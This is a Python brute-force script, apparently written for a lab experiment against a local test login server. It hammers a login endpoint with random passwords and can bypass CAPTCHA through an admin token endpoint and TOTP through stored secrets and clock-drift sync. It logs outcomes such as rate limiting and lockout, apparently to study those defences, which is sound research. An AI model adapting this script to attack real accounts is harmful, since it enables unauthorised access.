import requests
import string
import time
import os
import json
import random
import argparse
import pyotp
import csv
from datetime import datetime
import secrets

# ======================================
# CONFIGURATION
# ======================================
GROUP_SEED = 6631928
LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)

try:
    with open("users.json", "r") as f:
        USER_DATA = {u["username"]: u for u in json.load(f)}
except FileNotFoundError:
    print("[!] Error: users.json not found.")
    exit(1)


# ======================================
# HELPER FUNCTIONS
# ======================================

def get_captcha_token(base_url, session):
    """Obtains a CAPTCHA token from the admin endpoint."""
    try:
        admin_url = base_url.replace("/login", "/admin/get_captcha_token")
        r = session.get(admin_url, params={"group_seed": GROUP_SEED})
        if r.status_code == 200:
            return r.json().get("captcha_token")
    except Exception:
        pass
    return None


def generate_totp(username, clock_drift=0):
    user = USER_DATA.get(username)
    if user and user.get("totp_secret"):
        totp = pyotp.TOTP(user["totp_secret"])
        return totp.at(time.time() + clock_drift)
    return None


def perform_totp_sync(base_url, session, username, clock_drift):
    try:
        sync_url = base_url.replace("/login", "/totp/sync")
        code = generate_totp(username, clock_drift)
        if not code: return False

        print(f"[*] Attempting TOTP Sync for {username} with code {code} and drift {clock_drift}...")
        r = session.post(sync_url, json={"username": username, "totp_code": code})

        if r.status_code == 200:
            drift = r.json().get("synced_drift", "N/A")
            print(f"[*] Sync Successful! Server learned drift: {drift} seconds.")
            return True
        else:
            print(f"[!] Sync Failed: {r.status_code} - {r.text}")
            return False
    except Exception as e:
        print(f"[!] Sync Error: {e}")
        return False


def generate_random_password(category):
    if category == "weak":
        length = secrets.randbelow(3) + 4
        chars = string.ascii_lowercase + string.digits
    elif category == "medium":
        length = secrets.randbelow(4) + 7
        chars = string.ascii_letters + string.digits
    elif category == "strong":
        length = secrets.randbelow(6) + 11
        chars = string.ascii_letters + string.digits + "!@#$%^&*"
    else:
        length = 8
        chars = string.ascii_letters
    return ''.join(secrets.choice(chars) for _ in range(length))


# ======================================
# ATTACK LOGIC
# ======================================

def run_attack(target_url, target_username, category, max_attempts, output_file, use_bypass, clock_drift, smart_mode):
    print(f"[*] Starting attack on {target_username}")
    print(f"[*] Bypass Enabled: {use_bypass}")
    print(f"[*] Simulated Clock Drift: {clock_drift} seconds")
    if smart_mode:
        print(f"[*] Smart Mode: ON (Will try known password first)")

    session = requests.Session()

    with open(output_file, "w", newline="") as csvfile:
        fieldnames = ["timestamp", "attempt_number", "username", "password", "status", "latency_ms", "notes"]
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
        writer.writeheader()

        sync_performed = False

        for i in range(1, max_attempts + 1):
            # SMART MODE: Use the real password on the first attempt
            if smart_mode and i == 1:
                real_pass = USER_DATA.get(target_username, {}).get("password")
                if real_pass:
                    password = real_pass
                else:
                    password = generate_random_password(category)
            else:
                password = generate_random_password(category)

            payload = {
                "username": target_username,
                "password": password
            }

            # --- Attempt 1: Initial Login ---
            req_start = time.time()
            try:
                r = session.post(target_url, json=payload)
                latency = (time.time() - req_start) * 1000
                resp_data = r.json()
                status_code = r.status_code
            except Exception:
                break

            notes = ""
            total_latency = latency

            # --- CAPTCHA ---
            if status_code == 403 and resp_data.get("captcha_required"):
                if use_bypass:
                    notes += "captcha_required_bypass;"
                    token_start = time.time()
                    token = get_captcha_token(target_url, session)
                    token_latency = (time.time() - token_start) * 1000

                    if token:
                        notes += f"token_obtained;"
                        payload["captcha_token"] = token
                        retry_start = time.time()
                        r = session.post(target_url, json=payload)
                        total_latency += (time.time() - retry_start) * 1000 + token_latency
                        status_code = r.status_code
                        resp_data = r.json()
                else:
                    notes += "captcha_blocked;"

            # --- TOTP ---
            if status_code == 401 and "totp" in str(resp_data.get("reason", "")):
                notes += "totp_required;"
                code = generate_totp(target_username, clock_drift)
                payload["totp_code"] = code

                if use_bypass and not sync_performed:
                    r_check = session.post(target_url, json=payload)
                    if r_check.status_code == 200:
                        notes += "totp_success_on_first_try;"
                        status_code = 200
                        resp_data = r_check.json()
                    else:
                        notes += "totp_sync_needed;"
                        if perform_totp_sync(target_url, session, target_username, clock_drift):
                            sync_performed = True
                            retry_start = time.time()
                            r_retry = session.post(target_url, json=payload)
                            total_latency += (time.time() - retry_start) * 1000
                            status_code = r_retry.status_code
                            resp_data = r_retry.json()
                            if status_code == 200:
                                notes += "totp_success_after_sync;"
                elif status_code == 200:
                    notes += "totp_success;"

                if status_code != 200 and not use_bypass:
                    notes += "totp_blocked;"

            # Log Result
            result_status = "fail"
            if status_code == 200:
                result_status = "success"
            elif status_code == 429:
                result_status = "rate_limited"
            elif status_code == 423:
                result_status = "locked_out"
            elif status_code == 403:
                result_status = "captcha_block"

            writer.writerow({
                "timestamp": datetime.now().isoformat(),
                "attempt_number": i,
                "username": target_username,
                "password": password,
                "status": result_status,
                "latency_ms": round(total_latency, 2),
                "notes": notes
            })

            if i % 100 == 0 or status_code == 200:
                print(f"[{i}] {result_status} | {total_latency:.1f}ms")

            if result_status == "success":
                print(f"\n[!!!] CRACKED: {password}")
                break

    print(f"\n[*] Attack finished.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://127.0.0.1:5000/login")
    parser.add_argument("--username", required=True)
    parser.add_argument("--category", required=True)
    parser.add_argument("--attempts", type=int, default=50000)
    parser.add_argument("--tag", default="experiment")
    parser.add_argument("--no-bypass", action="store_true")
    parser.add_argument("--drift", type=int, default=0)
    parser.add_argument("--smart", action="store_true", help="Try the known password from users.json first")

    args = parser.parse_args()

    use_bypass = not args.no_bypass
    filename = f"{LOG_DIR}/bruteforce_{args.username}_{args.tag}.csv"

    run_attack(args.url, args.username, args.category, args.attempts, filename, use_bypass, args.drift, args.smart)